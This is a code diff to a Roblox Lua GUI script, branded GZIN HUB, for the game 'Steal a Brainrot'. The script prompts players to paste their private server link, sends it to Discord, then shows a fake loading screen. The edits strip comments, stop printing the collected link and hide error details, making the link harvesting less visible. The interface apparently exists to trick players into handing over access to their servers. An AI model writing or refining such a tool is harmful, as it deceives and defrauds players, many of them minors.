@@ -1,5 +1,5 @@
 --[[
-    Brainrot Experience GUI - FULLY CORRECTED
+    Brainrot Experience GUI - FULLY CORRECTED v2
     Modern fullscreen GUI for "Steal a Brainrot"
     GZIN HUB
 --]]
@@ -29,7 +29,7 @@ mainBg.Size = UDim2.new(1, 0, 1, 0)
 mainBg.Position = UDim2.new(0, 0, 0, 0)
 mainBg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
 mainBg.BorderSizePixel = 0
-mainBg.BackgroundTransparency = 1  -- INVISÍVEL NO INÍCIO
+mainBg.BackgroundTransparency = 1
 mainBg.Parent = screenGui
 
 -- Main Frame - Centered
@@ -51,7 +51,6 @@ mainShadow.Thickness = 2
 mainShadow.Transparency = 0.5
 mainShadow.Parent = mainFrame
 
--- Top gradient bar
 local topBar = Instance.new("Frame")
 topBar.Name = "TopBar"
 topBar.Size = UDim2.new(1, 0, 0, 60)
@@ -270,10 +269,7 @@ local function showNotification(message, duration)
     notificationFrame.Visible = false
 end
 
--- FUNÇÃO PARA VALIDAR SE É UM LINK ROBLOX PRIVADO
 local function isValidRobloxPrivateServerLink(link)
-    -- Valida links como: https://www.roblox.com/games/123456789
-    -- Ou: roblox.com/games/123456789
     local isRobloxLink = string.match(link, "roblox%.com/games/%d+") ~= nil
     if not isRobloxLink then
         return false, "❌ Link inválido! Deve ser um link de servidor privado Roblox"
@@ -281,10 +277,8 @@ local function isValidRobloxPrivateServerLink(link)
     return true, nil
 end
 
--- FUNÇÃO PARA ENVIAR AO DISCORD - CORRIGIDA COM HttpService:PostAsync
 local function sendToDiscord(serverLink)
     print("📤 Enviando para Discord...")
-    print("Link: " .. serverLink)
     
     local payload = {
         content = "🎮 **Novo Link Coletado!**",
@@ -333,7 +327,7 @@ local function sendToDiscord(serverLink)
         return true
     else
         print("❌ Erro ao enviar: " .. tostring(response))
-        showNotification("❌ Erro ao enviar link: " .. tostring(response), 3)
+        showNotification("❌ Erro ao enviar link", 3)
         return false
     end
 end
@@ -357,32 +351,27 @@ end
 local function onDoneClick()
     local inputText = inputBox.Text:match("^%s*(.-)%s*$") or ""
     
-    -- VALIDAÇÃO 1: Link vazio?
     if inputText == "" then
         showNotification("❌ Cole o link do servidor!", 3)
         return
     end
     
-    -- VALIDAÇÃO 2: É um link Roblox privado válido?
     local isValid, errorMsg = isValidRobloxPrivateServerLink(inputText)
     if not isValid then
         showNotification(errorMsg, 3)
         return
     end
     
-    -- VALIDAÇÃO 3: Tem Brainrot suficiente?
     local brainrotValue = getBrainrotValue()
     if brainrotValue < REQUIRED_BRAINROT then
         showNotification("❌ Você precisa de 100M+ Brainrot\nVocê tem: " .. brainrotValue, 4)
         return
     end
     
-    -- ENVIA AO DISCORD
     sendToDiscord(inputText)
     
-    -- FULLSCREEN LOADING
     mainFrame.Visible = false
-    mainBg.BackgroundTransparency = 0  -- AGORA FICA PRETO
+    mainBg.BackgroundTransparency = 0
     loadingScreen.Visible = true
     
     loadingTitle.Visible = true
@@ -406,7 +395,6 @@ local function onDoneClick()
     
     task.wait(3)
     
-    -- VOLTA AO NORMAL
     loadingScreen.Visible = false
     mainBg.BackgroundTransparency = 1
     mainFrame.Visible = true
